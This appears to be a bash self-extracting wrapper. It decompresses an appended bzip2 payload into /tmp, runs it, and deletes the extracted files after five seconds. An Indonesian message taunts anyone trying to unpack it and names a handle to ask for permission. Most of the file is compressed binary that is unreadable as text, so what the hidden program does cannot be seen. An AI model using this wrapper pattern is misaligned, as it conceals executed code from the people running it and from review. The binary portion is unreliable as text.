#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SYم\�  �߀@��/�:����Pso^�
P�iOPh �H  ���M@     dh ��UI�a0L0���%"z���L�4M��   = �I��?T��䞉�jh1=C@=4������M�17�S���Y�!�,�$P�����	6�mI�8>��%��@��L`�.0���      
�!�
��k;Db�TL��[Q.a-���(Ag��(f��^�m�QGl��Pr�P!@ADP5l�A�ղ��SZɋ�@��E��/���Q��7XH��� �Y����������������ФI					h#��!���	���v�z#,��S�e�A�փ��#D�\h;�uo��M�}��q�G�S#�C�? ��	'@sE�DG�d�Q�(��G���w�(�#�kٍ�6]����|��s��bR�&�U!m��^�j�hc ��5/�u���/�I$�M�?�_��0�}</v�2B@��g�F�gV@���U�r�H�uN~9����#�:����o*�h⿱�꼠6��'��Yf�[h�#��#޸���T*҄���b��Q�#V�7��\�k��(��40|G�p4�����:6(���#mA���6� i�������B���ǔF������A���:����:cH�TF�6���GSQÃp�-�5�d�KΣ��EJ�v�u��I5h�mÈ�#K��I$��� ���'�#�s�yN:\�����)��*��